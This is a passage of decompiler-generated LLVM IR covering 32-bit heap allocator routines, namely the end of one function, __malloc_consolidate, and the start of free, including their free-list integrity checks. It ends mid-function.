  %v1_8050d5c = add i32 %v0_8050d57, 872
  %v2_8050d5c = inttoptr i32 %v1_8050d5c to i32*
  %v3_8050d5c = load i32, i32* %v2_8050d5c, align 4
  %v5_8050d5c = sub i32 %v3_8050d5c, %v2_8050d53
  store i32 %v5_8050d5c, i32* %v2_8050d5c, align 4
  %v0_8050d62 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050d62 = or i32 %v0_8050d62, 1
  store i32 %v1_8050d62, i32* %esi.global-to-local, align 4
  %v1_8050d65 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050d65 = add i32 %v1_8050d65, 4
  %v3_8050d65 = inttoptr i32 %v2_8050d65 to i32*
  store i32 %v1_8050d62, i32* %v3_8050d65, align 4
  br label %dec_label_pc_8050d71

dec_label_pc_8050d6f:                             ; preds = %dec_label_pc_8050d51, %dec_label_pc_8050d32, %dec_label_pc_8050d1a, %entry
  br label %dec_label_pc_8050d71

dec_label_pc_8050d71:                             ; preds = %dec_label_pc_8050d57, %dec_label_pc_8050d6f
  %storemerge = phi i32 [ 1, %dec_label_pc_8050d57 ], [ 0, %dec_label_pc_8050d6f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050cf0, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050d44, { 1, 0, 2 }
  uselistorder i32 %v4_8050d13, { 1, 2, 0 }
  uselistorder i32 %v3_8050cf5, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8050ced, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050d71, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8050d7a = load i32, i32* @edi, align 4
  %v0_8050d7b = load i32, i32* @esi, align 4
  %v0_8050d7c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8050d84 = load i32, i32* %arg1, align 4
  store i32 %v2_8050d84, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8050d8b = icmp eq i32 %v2_8050d84, 0
  br i1 %v1_8050d8b, label %dec_label_pc_8050eb4.preheader, label %dec_label_pc_8050d93

dec_label_pc_8050eb4.preheader:                   ; preds = %entry
  %v3_8050ea9 = add i32 %tmp11, 44
  br label %dec_label_pc_8050ea5

dec_label_pc_8050d93:                             ; preds = %entry
  %v1_8050d97 = and i32 %v2_8050d84, -3
  store i32 %v1_8050d97, i32* %arg1, align 4
  %v1_8050d9c = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_8050dab = add i32 %tmp11, 4
  store i32 %v1_8050dab, i32* %eax.global-to-local, align 4
  %v2_8050db2 = load i32, i32* %arg1, align 4
  %v2_8050db8 = udiv i32 %v2_8050db2, 8
  %v2_8050dbb = mul nuw i32 %v2_8050db8, 4
  %v3_8050dbb = add i32 %tmp11, -4
  %v4_8050dbb = add i32 %v3_8050dbb, %v2_8050dbb
  store i32 %v4_8050dbb, i32* %eax.global-to-local, align 4
  %v2_8050e82 = add i32 %tmp11, 44
  %v3_8050e82 = inttoptr i32 %v2_8050e82 to i32*
  %v1_8050e55 = add i32 %tmp11, 60
  %v2_8050e55 = inttoptr i32 %v1_8050e55 to i32*
  br label %dec_label_pc_8050dc3

dec_label_pc_8050dc3:                             ; preds = %dec_label_pc_8050e9b, %dec_label_pc_8050d93
  %v0_8050dd1 = phi i32 [ %v1_8050dab, %dec_label_pc_8050d93 ], [ %v4_8050e9b, %dec_label_pc_8050e9b ]
  store i32 %v0_8050dd1, i32* %eax.global-to-local, align 4
  %v1_8050dc7 = inttoptr i32 %v0_8050dd1 to i32*
  %v2_8050dc7 = load i32, i32* %v1_8050dc7, align 4
  store i32 %v2_8050dc7, i32* @ecx, align 4
  %v1_8050dc9 = icmp eq i32 %v2_8050dc7, 0
  br i1 %v1_8050dc9, label %dec_label_pc_8050e91, label %dec_label_pc_8050dd1

dec_label_pc_8050dd1:                             ; preds = %dec_label_pc_8050dc3
  store i32 0, i32* %v1_8050dc7, align 4
  %v0_8050dd7.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050dd7

dec_label_pc_8050dd7:                             ; preds = %dec_label_pc_8050e85, %dec_label_pc_8050dd1
  %v0_8050df4 = phi i32 [ %v3_8050dd7, %dec_label_pc_8050e85 ], [ %v0_8050dd7.pre, %dec_label_pc_8050dd1 ]
  %v1_8050dd7 = add i32 %v0_8050df4, 8
  %v2_8050dd7 = inttoptr i32 %v1_8050dd7 to i32*
  %v3_8050dd7 = load i32, i32* %v2_8050dd7, align 4
  store i32 %v3_8050dd7, i32* %edx.global-to-local, align 4
  %v1_8050dde = add i32 %v0_8050df4, 4
  %v2_8050dde = inttoptr i32 %v1_8050dde to i32*
  %v3_8050dde = load i32, i32* %v2_8050dde, align 4
  store i32 %v3_8050dde, i32* %eax.global-to-local, align 4
  %v1_8050de3 = and i32 %v3_8050dde, -2
  store i32 %v1_8050de3, i32* @edi, align 4
  %v2_8050de6 = urem i32 %v3_8050dde, 2
  %v3_8050de6 = icmp eq i32 %v2_8050de6, 0
  %v2_8050de8 = add i32 %v1_8050de3, %v0_8050df4
  store i32 %v2_8050de8, i32* @ebx, align 4
  %v1_8050deb = add i32 %v2_8050de8, 4
  %v2_8050deb = inttoptr i32 %v1_8050deb to i32*
  %v3_8050deb = load i32, i32* %v2_8050deb, align 4
  store i32 %v3_8050deb, i32* %edx.global-to-local, align 4
  %v1_8050df2 = icmp eq i1 %v3_8050de6, false
  br i1 %v1_8050df2, label %dec_label_pc_8050e14, label %dec_label_pc_8050df4

dec_label_pc_8050df4:                             ; preds = %dec_label_pc_8050dd7
  %v1_8050df4 = inttoptr i32 %v0_8050df4 to i32*
  %v2_8050df4 = load i32, i32* %v1_8050df4, align 4
  store i32 %v2_8050df4, i32* %ebp.global-to-local, align 4
  %v2_8050df8 = sub i32 %v0_8050df4, %v2_8050df4
  store i32 %v2_8050df8, i32* %eax.global-to-local, align 4
  %v1_8050dfa = add i32 %v2_8050df8, 8
  %v2_8050dfa = inttoptr i32 %v1_8050dfa to i32*
  %v3_8050dfa = load i32, i32* %v2_8050dfa, align 4
  store i32 %v3_8050dfa, i32* @esi, align 4
  %v1_8050dfd = add i32 %v2_8050df8, 12
  %v2_8050dfd = inttoptr i32 %v1_8050dfd to i32*
  %v3_8050dfd = load i32, i32* %v2_8050dfd, align 4
  store i32 %v3_8050dfd, i32* %edx.global-to-local, align 4
  %v1_8050e00 = add i32 %v3_8050dfa, 12
  %v2_8050e00 = inttoptr i32 %v1_8050e00 to i32*
  %v3_8050e00 = load i32, i32* %v2_8050e00, align 4
  store i32 %v3_8050e00, i32* @ecx, align 4
  %v12_8050e03 = icmp eq i32 %v3_8050e00, %v2_8050df8
  %v1_8050e05 = icmp eq i1 %v12_8050e03, false
  br i1 %v1_8050e05, label %dec_label_pc_8050e44, label %dec_label_pc_8050e07

dec_label_pc_8050e07:                             ; preds = %dec_label_pc_8050df4
  %v1_8050e07 = add i32 %v3_8050dfd, 8
  %v2_8050e07 = inttoptr i32 %v1_8050e07 to i32*
  %v3_8050e07 = load i32, i32* %v2_8050e07, align 4
  %v15_8050e07 = icmp eq i32 %v3_8050e07, %v3_8050e00
  %v1_8050e0a = icmp eq i1 %v15_8050e07, false
  br i1 %v1_8050e0a, label %dec_label_pc_8050e44, label %dec_label_pc_8050e0c

dec_label_pc_8050e0c:                             ; preds = %dec_label_pc_8050e07
  %v2_8050e0c = add i32 %v2_8050df4, %v1_8050de3
  store i32 %v2_8050e0c, i32* @edi, align 4
  store i32 %v3_8050dfd, i32* %v2_8050e00, align 4
  %v0_8050e11 = load i32, i32* @esi, align 4
  %v1_8050e11 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e11 = add i32 %v1_8050e11, 8
  %v3_8050e11 = inttoptr i32 %v2_8050e11 to i32*
  store i32 %v0_8050e11, i32* %v3_8050e11, align 4
  %v0_8050e1f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050e14

dec_label_pc_8050e14:                             ; preds = %dec_label_pc_8050dd7, %dec_label_pc_8050e0c
  %v1_8050e28 = phi i32 [ %v2_8050de8, %dec_label_pc_8050dd7 ], [ %v0_8050e1f.pre, %dec_label_pc_8050e0c ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050e1c = and i32 %v3_8050deb, -4
  store i32 %v1_8050e1c, i32* %ebp.global-to-local, align 4
  %v4_8050e1f = load i32, i32* %v3_8050e82, align 4
  %v15_8050e1f = icmp eq i32 %v1_8050e28, %v4_8050e1f
  br i1 %v15_8050e1f, label %dec_label_pc_8050e75, label %dec_label_pc_8050e24

dec_label_pc_8050e24:                             ; preds = %dec_label_pc_8050e14
  %v2_8050e24 = add i32 %v1_8050e28, 4
  %v3_8050e24 = add i32 %v2_8050e24, %v1_8050e1c
  %v4_8050e24 = inttoptr i32 %v3_8050e24 to i32*
  %v5_8050e24 = load i32, i32* %v4_8050e24, align 4
  store i32 %v5_8050e24, i32* %eax.global-to-local, align 4
  %v3_8050e28 = inttoptr i32 %v2_8050e24 to i32*
  store i32 %v1_8050e1c, i32* %v3_8050e28, align 4
  %v0_8050e2b = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e2b = urem i32 %v0_8050e2b, 2
  %v2_8050e2b = icmp eq i32 %v1_8050e2b, 0
  store i32 %v1_8050e2b, i32* %eax.global-to-local, align 4
  %v1_8050e30 = icmp eq i1 %v2_8050e2b, false
  br i1 %v1_8050e30, label %dec_label_pc_8050e51, label %dec_label_pc_8050e32

dec_label_pc_8050e32:                             ; preds = %dec_label_pc_8050e24
  %v0_8050e32 = load i32, i32* @ebx, align 4
  %v1_8050e32 = add i32 %v0_8050e32, 8
  %v2_8050e32 = inttoptr i32 %v1_8050e32 to i32*
  %v3_8050e32 = load i32, i32* %v2_8050e32, align 4
  store i32 %v3_8050e32, i32* @edx, align 4
  %v1_8050e35 = add i32 %v0_8050e32, 12
  %v2_8050e35 = inttoptr i32 %v1_8050e35 to i32*
  %v3_8050e35 = load i32, i32* %v2_8050e35, align 4
  store i32 %v3_8050e35, i32* %eax.global-to-local, align 4
  %v1_8050e38 = add i32 %v3_8050e32, 12
  %v2_8050e38 = inttoptr i32 %v1_8050e38 to i32*
  %v3_8050e38 = load i32, i32* %v2_8050e38, align 4
  store i32 %v3_8050e38, i32* @esi, align 4
  %v12_8050e3b = icmp eq i32 %v3_8050e38, %v0_8050e32
  %v1_8050e3d = icmp eq i1 %v12_8050e3b, false
  br i1 %v1_8050e3d, label %dec_label_pc_8050e44, label %dec_label_pc_8050e3f

dec_label_pc_8050e3f:                             ; preds = %dec_label_pc_8050e32
  %v1_8050e3f = add i32 %v3_8050e35, 8
  %v2_8050e3f = inttoptr i32 %v1_8050e3f to i32*
  %v3_8050e3f = load i32, i32* %v2_8050e3f, align 4
  %v15_8050e3f = icmp eq i32 %v3_8050e3f, %v3_8050e38
  br i1 %v15_8050e3f, label %dec_label_pc_8050e49, label %dec_label_pc_8050e44

dec_label_pc_8050e44:                             ; preds = %dec_label_pc_8050e3f, %dec_label_pc_8050e32, %dec_label_pc_8050e07, %dec_label_pc_8050df4
  %v0_8050e44 = call i32 @abort()
  store i32 %v0_8050e44, i32* %eax.global-to-local, align 4
  %v1_8050e4b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050e49

dec_label_pc_8050e49:                             ; preds = %dec_label_pc_8050e3f, %dec_label_pc_8050e44
  %v1_8050e4b = phi i32 [ %v3_8050e32, %dec_label_pc_8050e3f ], [ %v1_8050e4b.pre, %dec_label_pc_8050e44 ]
  %v0_8050e4b = phi i32 [ %v3_8050e35, %dec_label_pc_8050e3f ], [ %v0_8050e44, %dec_label_pc_8050e44 ]
  %v0_8050e49 = load i32, i32* @edi, align 4
  %v1_8050e49 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050e49 = add i32 %v1_8050e49, %v0_8050e49
  store i32 %v2_8050e49, i32* @edi, align 4
  %v2_8050e4b = add i32 %v1_8050e4b, 12
  %v3_8050e4b = inttoptr i32 %v2_8050e4b to i32*
  store i32 %v0_8050e4b, i32* %v3_8050e4b, align 4
  %v0_8050e4e = load i32, i32* @edx, align 4
  %v1_8050e4e = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e4e = add i32 %v1_8050e4e, 8
  %v3_8050e4e = inttoptr i32 %v2_8050e4e to i32*
  store i32 %v0_8050e4e, i32* %v3_8050e4e, align 4
  br label %dec_label_pc_8050e51

dec_label_pc_8050e51:                             ; preds = %dec_label_pc_8050e24, %dec_label_pc_8050e49
  store i32 %v1_8050d9c, i32* %eax.global-to-local, align 4
  %v3_8050e55 = load i32, i32* %v2_8050e55, align 4
  store i32 %v3_8050e55, i32* @edx, align 4
  %v0_8050e58 = load i32, i32* @ecx, align 4
  store i32 %v0_8050e58, i32* %v2_8050e55, align 4
  %v0_8050e5b = load i32, i32* @edi, align 4
  %v1_8050e5d = or i32 %v0_8050e5b, 1
  %v1_8050e60 = load i32, i32* @ecx, align 4
  %v2_8050e60 = add i32 %v1_8050e60, 4
  %v3_8050e60 = inttoptr i32 %v2_8050e60 to i32*
  store i32 %v1_8050e5d, i32* %v3_8050e60, align 4
  %v0_8050e63 = load i32, i32* @ecx, align 4
  %v1_8050e63 = load i32, i32* @edx, align 4
  %v2_8050e63 = add i32 %v1_8050e63, 12
  %v3_8050e63 = inttoptr i32 %v2_8050e63 to i32*
  store i32 %v0_8050e63, i32* %v3_8050e63, align 4
  store i32 %v1_8050d9c, i32* %eax.global-to-local, align 4
  %v0_8050e6a = load i32, i32* @edx, align 4
  %v1_8050e6a = load i32, i32* @ecx, align 4
  %v2_8050e6a = add i32 %v1_8050e6a, 8
  %v3_8050e6a = inttoptr i32 %v2_8050e6a to i32*
  store i32 %v0_8050e6a, i32* %v3_8050e6a, align 4
  %v0_8050e6d = load i32, i32* @edi, align 4
  %v1_8050e6d = load i32, i32* @ecx, align 4
  %v3_8050e6d = add i32 %v1_8050e6d, %v0_8050e6d
  %v4_8050e6d = inttoptr i32 %v3_8050e6d to i32*
  store i32 %v0_8050e6d, i32* %v4_8050e6d, align 4
  %v0_8050e70 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e70 = load i32, i32* @ecx, align 4
  %v2_8050e70 = add i32 %v1_8050e70, 12
  %v3_8050e70 = inttoptr i32 %v2_8050e70 to i32*
  store i32 %v0_8050e70, i32* %v3_8050e70, align 4
  br label %dec_label_pc_8050e85

dec_label_pc_8050e75:                             ; preds = %dec_label_pc_8050e14
  %v0_8050e75 = load i32, i32* @edi, align 4
  %v2_8050e75 = add i32 %v0_8050e75, %v1_8050e1c
  %v1_8050e78 = or i32 %v2_8050e75, 1
  store i32 %v1_8050e78, i32* %eax.global-to-local, align 4
  %v1_8050e7b = load i32, i32* @ecx, align 4
  %v2_8050e7b = add i32 %v1_8050e7b, 4
  %v3_8050e7b = inttoptr i32 %v2_8050e7b to i32*
  store i32 %v1_8050e78, i32* %v3_8050e7b, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8050e82 = load i32, i32* @ecx, align 4
  store i32 %v0_8050e82, i32* %v3_8050e82, align 4
  br label %dec_label_pc_8050e85

dec_label_pc_8050e85:                             ; preds = %dec_label_pc_8050e51, %dec_label_pc_8050e75
  store i32 %v3_8050dd7, i32* @ecx, align 4
  %v1_8050e89 = icmp eq i32 %v3_8050dd7, 0
  %v1_8050e8b = icmp eq i1 %v1_8050e89, false
  br i1 %v1_8050e8b, label %dec_label_pc_8050dd7, label %dec_label_pc_8050e91

dec_label_pc_8050e91:                             ; preds = %dec_label_pc_8050e85, %dec_label_pc_8050dc3
  store i32 %v4_8050dbb, i32* @ecx, align 4
  %v15_8050e95 = icmp eq i32 %v0_8050dd1, %v4_8050dbb
  br i1 %v15_8050e95, label %dec_label_pc_8050f19, label %dec_label_pc_8050e9b

dec_label_pc_8050e9b:                             ; preds = %dec_label_pc_8050e91
  %v4_8050e9b = add i32 %v0_8050dd1, 4
  br label %dec_label_pc_8050dc3

dec_label_pc_8050ea5:                             ; preds = %dec_label_pc_8050eb4.preheader, %dec_label_pc_8050ea5
  %v1_8050ea920 = phi i32 [ 1, %dec_label_pc_8050eb4.preheader ], [ %v0_8050eb4.pre, %dec_label_pc_8050ea5 ]
  %v2_8050ea9 = mul i32 %v1_8050ea920, 8
  %v4_8050ea9 = add i32 %v3_8050ea9, %v2_8050ea9
  store i32 %v4_8050ea9, i32* %eax.global-to-local, align 4
  %v1_8050ead = add i32 %v1_8050ea920, 1
  store i32 %v1_8050ead, i32* %edx.global-to-local, align 4
  %v2_8050eae = add i32 %v4_8050ea9, 12
  %v3_8050eae = inttoptr i32 %v2_8050eae to i32*
  store i32 %v4_8050ea9, i32* %v3_8050eae, align 4
  %v0_8050eb1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050eb1 = add i32 %v0_8050eb1, 8
  %v3_8050eb1 = inttoptr i32 %v2_8050eb1 to i32*
  store i32 %v0_8050eb1, i32* %v3_8050eb1, align 4
  %v0_8050eb4.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8050eb7 = icmp sgt i32 %v0_8050eb4.pre, 95
  br i1 %v7_8050eb7, label %dec_label_pc_8050eb9, label %dec_label_pc_8050ea5

dec_label_pc_8050eb9:                             ; preds = %dec_label_pc_8050ea5
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050ebd = add i32 %tmp11, 864
  %v2_8050ebd = inttoptr i32 %v1_8050ebd to i32*
  %v3_8050ebd = load i32, i32* %v2_8050ebd, align 4
  %v4_8050ebd = or i32 %v3_8050ebd, 1
  store i32 %v4_8050ebd, i32* %v2_8050ebd, align 4
  %v0_8050ec4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ec4 = add i32 %v0_8050ec4, 840
  %v2_8050ec4 = inttoptr i32 %v1_8050ec4 to i32*
  store i32 0, i32* %v2_8050ec4, align 4
  %v0_8050ece = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ece = add i32 %v0_8050ece, 852
  %v2_8050ece = inttoptr i32 %v1_8050ece to i32*
  store i32 65536, i32* %v2_8050ece, align 4
  %v0_8050ed8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ed8 = add i32 %v0_8050ed8, 844
  %v2_8050ed8 = inttoptr i32 %v1_8050ed8 to i32*
  store i32 262144, i32* %v2_8050ed8, align 4
  %v0_8050ee2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ee2 = add i32 %v0_8050ee2, 836
  %v2_8050ee2 = inttoptr i32 %v1_8050ee2 to i32*
  store i32 262144, i32* %v2_8050ee2, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_8050ef3 = load i32, i32* %arg1, align 4
  %v1_8050ef5 = urem i32 %v2_8050ef3, 4
  %v1_8050ef8 = or i32 %v1_8050ef5, 72
  store i32 %v1_8050ef8, i32* %arg1, align 4
  %v0_8050efd = load i32, i32* @edx, align 4
  %v1_8050eff = add i32 %v0_8050efd, 52
  store i32 %v1_8050eff, i32* %eax.global-to-local, align 4
  %v2_8050f02 = add i32 %v0_8050efd, 44
  %v3_8050f02 = inttoptr i32 %v2_8050f02 to i32*
  store i32 %v1_8050eff, i32* %v3_8050f02, align 4
  %v1_8050f07 = call i32 @sysconf(i32 30)
  store i32 %v1_8050f07, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8050f13 = add i32 %tmp11, 860
  %v3_8050f13 = inttoptr i32 %v2_8050f13 to i32*
  store i32 %v1_8050f07, i32* %v3_8050f13, align 4
  br label %dec_label_pc_8050f19

dec_label_pc_8050f19:                             ; preds = %dec_label_pc_8050e91, %dec_label_pc_8050eb9
  store i32 %v0_8050d7c, i32* @ebx, align 4
  store i32 %v0_8050d7b, i32* @esi, align 4
  store i32 %v0_8050d7a, i32* @edi, align 4
  %v0_8050f20 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050f20

; uselistorder directives
  uselistorder i32 %v0_8050eb1, { 1, 0 }
  uselistorder i32 %v0_8050e6d, { 1, 0 }
  uselistorder i32 %v1_8050e2b, { 1, 0 }
  uselistorder i32 %v2_8050e24, { 1, 0 }
  uselistorder i32 %v1_8050e1c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050e28, { 1, 0 }
  uselistorder i32 %v3_8050dd7, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8050df4, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8050dd1, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8050e82, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8050f19, { 1, 0 }
  uselistorder label %dec_label_pc_8050ea5, { 1, 0 }
  uselistorder label %dec_label_pc_8050e85, { 1, 0 }
  uselistorder label %dec_label_pc_8050e51, { 1, 0 }
  uselistorder label %dec_label_pc_8050e49, { 1, 0 }
  uselistorder label %dec_label_pc_8050e14, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050f21 = load i32, i32* @ebp, align 4
  %v0_8050f22 = load i32, i32* @edi, align 4
  %v0_8050f23 = load i32, i32* @esi, align 4
  %v0_8050f24 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050f2c = icmp eq i32 %arg1, 0
  br i1 %v1_8050f2c, label %dec_label_pc_80510b5, label %dec_label_pc_8050f34

dec_label_pc_8050f34:                             ; preds = %entry
  %v2_8050f3f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050f3f, i32* @eax, align 4
  %v2_8050f44 = call i32 @__pthread_return_void(i32 %v2_8050f3f, i32 134552291)
  store i32 %v2_8050f44, i32* %eax.global-to-local, align 4
  %v1_8050f50 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a590.187 to i32))
  %v1_8050f55 = add i32 %arg1, -8
  store i32 %v1_8050f55, i32* @ecx, align 4
  %v0_8050f58 = load i8, i8* @global_var_8060a00.188, align 1
  %v1_8050f58 = sext i8 %v0_8050f58 to i32
  store i32 %v1_8050f58, i32* %eax.global-to-local, align 4
  %v1_8050f5d = add i32 %arg1, -4
  %v2_8050f5d = inttoptr i32 %v1_8050f5d to i32*
  %v3_8050f5d = load i32, i32* %v2_8050f5d, align 4
  store i32 %v3_8050f5d, i32* @edx, align 4
  %v1_8050f65 = and i32 %v3_8050f5d, -4
  %v4_8050f65 = trunc i32 %v1_8050f65 to i8
  store i32 %v1_8050f65, i32* @ebx, align 4
  %v8_8050f6a = icmp ugt i8 %v4_8050f65, %v0_8050f58
  br i1 %v8_8050f6a, label %dec_label_pc_8050f8c, label %dec_label_pc_8050f6c

dec_label_pc_8050f6c:                             ; preds = %dec_label_pc_8050f34
  %v1_8050f6c = or i32 %v1_8050f58, 3
  %v3_8050f6c = trunc i32 %v1_8050f6c to i8
  store i32 %v1_8050f6c, i32* %eax.global-to-local, align 4
  %v2_8050f6f = udiv i32 %v3_8050f5d, 8
  store i8 %v3_8050f6c, i8* @global_var_8060a00.188, align 512
  %v1_8050f77 = mul nuw i32 %v2_8050f6f, 4
  %v2_8050f77 = add i32 %v1_8050f77, ptrtoint (i8* @global_var_8060a00.188 to i32)
  store i32 %v2_8050f77, i32* @edx, align 4
  %v1_8050f7e = add i32 %v1_8050f77, add (i32 ptrtoint (i8* @global_var_8060a00.188 to i32), i32 -4)
  %v2_8050f7e = inttoptr i32 %v1_8050f7e to i32*
  %v3_8050f7e = load i32, i32* %v2_8050f7e, align 4
  store i32 %v3_8050f7e, i32* %eax.global-to-local, align 4
  %v3_8050f81 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8050f7e, i32* %v3_8050f81, align 4
  %v0_8050f84 = load i32, i32* @ecx, align 4
  %v1_8050f84 = load i32, i32* @edx, align 4
  %v2_8050f84 = add i32 %v1_8050f84, -4
  %v3_8050f84 = inttoptr i32 %v2_8050f84 to i32*
  store i32 %v0_8050f84, i32* %v3_8050f84, align 4
  br label %dec_label_pc_80510a4

dec_label_pc_8050f8c:                             ; preds = %dec_label_pc_8050f34
  %v2_8050f8c = and i32 %v3_8050f5d, 2
  %v3_8050f8c = icmp eq i32 %v2_8050f8c, 0
  %v1_8050f8f = icmp eq i1 %v3_8050f8c, false
  br i1 %v1_8050f8f, label %dec_label_pc_8051084, label %dec_label_pc_8050f95

dec_label_pc_8050f95:                             ; preds = %dec_label_pc_8050f8c
  %v1_8050f95 = or i32 %v1_8050f58, 1
  %v3_8050f95 = trunc i32 %v1_8050f95 to i8
  store i32 %v1_8050f95, i32* %eax.global-to-local, align 4
  store i8 %v3_8050f95, i8* @global_var_8060a00.188, align 512
  %v2_8050f9d = add i32 %v1_8050f65, %v1_8050f55
  store i32 %v2_8050f9d, i32* @esi, align 4
  %v1_8050fa0 = add i32 %v2_8050f9d, 4
  %v2_8050fa0 = inttoptr i32 %v1_8050fa0 to i32*
  %v3_8050fa0 = load i32, i32* %v2_8050fa0, align 4
  store i32 %v3_8050fa0, i32* %eax.global-to-local, align 4
  %v2_8050fa7 = inttoptr i32 %v1_8050f5d to i8*
  %v3_8050fa7 = load i8, i8* %v2_8050fa7, align 1
  %v4_8050fa7 = urem i8 %v3_8050fa7, 2
  %v5_8050fa7 = icmp eq i8 %v4_8050fa7, 0
  %v1_8050fab = icmp eq i1 %v5_8050fa7, false
  br i1 %v1_8050fab, label %dec_label_pc_8050fce, label %dec_label_pc_8050fad

dec_label_pc_8050fad:                             ; preds = %dec_label_pc_8050f95
  %v2_8050fad = inttoptr i32 %v1_8050f55 to i32*
  %v3_8050fad = load i32, i32* %v2_8050fad, align 4
  store i32 %v3_8050fad, i32* @ebp, align 4
  %v2_8050fb2 = sub i32 %v1_8050f55, %v3_8050fad
  store i32 %v2_8050fb2, i32* %eax.global-to-local, align 4
  %v1_8050fb4 = add i32 %v2_8050fb2, 8
  %v2_8050fb4 = inttoptr i32 %v1_8050fb4 to i32*
  %v3_8050fb4 = load i32, i32* %v2_8050fb4, align 4
  store i32 %v3_8050fb4, i32* @edi, align 4
  %v1_8050fb7 = add i32 %v2_8050fb2, 12
  %v2_8050fb7 = inttoptr i32 %v1_8050fb7 to i32*
  %v3_8050fb7 = load i32, i32* %v2_8050fb7, align 4
  store i32 %v3_8050fb7, i32* @edx, align 4
  %v1_8050fba = add i32 %v3_8050fb4, 12
  %v2_8050fba = inttoptr i32 %v1_8050fba to i32*
  %v3_8050fba = load i32, i32* %v2_8050fba, align 4
  store i32 %v3_8050fba, i32* @ecx, align 4
  %v12_8050fbd = icmp eq i32 %v3_8050fba, %v2_8050fb2
  %v1_8050fbf = icmp eq i1 %v12_8050fbd, false
  br i1 %v1_8050fbf, label %dec_label_pc_8050ffd, label %dec_label_pc_8050fc1

dec_label_pc_8050fc1:                             ; preds = %dec_label_pc_8050fad
  %v1_8050fc1 = add i32 %v3_8050fb7, 8
  %v2_8050fc1 = inttoptr i32 %v1_8050fc1 to i32*
  %v3_8050fc1 = load i32, i32* %v2_8050fc1, align 4
  %v15_8050fc1 = icmp eq i32 %v3_8050fc1, %v3_8050fba
  %v1_8050fc4 = icmp eq i1 %v15_8050fc1, false
  br i1 %v1_8050fc4, label %dec_label_pc_8050ffd, label %dec_label_pc_8050fc6

dec_label_pc_8050fc6:                             ; preds = %dec_label_pc_8050fc1
  %v2_8050fc6 = add i32 %v3_8050fad, %v1_8050f65
  store i32 %v2_8050fc6, i32* @ebx, align 4
  store i32 %v3_8050fb7, i32* %v2_8050fba, align 4
  %v0_8050fcb = load i32, i32* @edi, align 4
  %v1_8050fcb = load i32, i32* @edx, align 4
  %v2_8050fcb = add i32 %v1_8050fcb, 8
  %v3_8050fcb = inttoptr i32 %v2_8050fcb to i32*
  store i32 %v0_8050fcb, i32* %v3_8050fcb, align 4
  %v0_8050fd5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050fce

dec_label_pc_8050fce:                             ; preds = %dec_label_pc_8050f95, %dec_label_pc_8050fc6
  %v1_8050fe1 = phi i32 [ %v2_8050f9d, %dec_label_pc_8050f95 ], [ %v0_8050fd5.pre, %dec_label_pc_8050fc6 ]
  %v1_8050fd2 = and i32 %v3_8050fa0, -4
  store i32 %v1_8050fd2, i32* @ebp, align 4
  %v1_8050fd5 = load i32, i32* @global_var_8060a2c.189, align 4
  %v12_8050fd5 = icmp eq i32 %v1_8050fe1, %v1_8050fd5
  br i1 %v12_8050fd5, label %dec_label_pc_805102f, label %dec_label_pc_8050fdd

dec_label_pc_8050fdd:                             ; preds = %dec_label_pc_8050fce
  %v2_8050fdd = add i32 %v1_8050fe1, 4
  %v3_8050fdd = add i32 %v2_8050fdd, %v1_8050fd2
  %v4_8050fdd = inttoptr i32 %v3_8050fdd to i32*
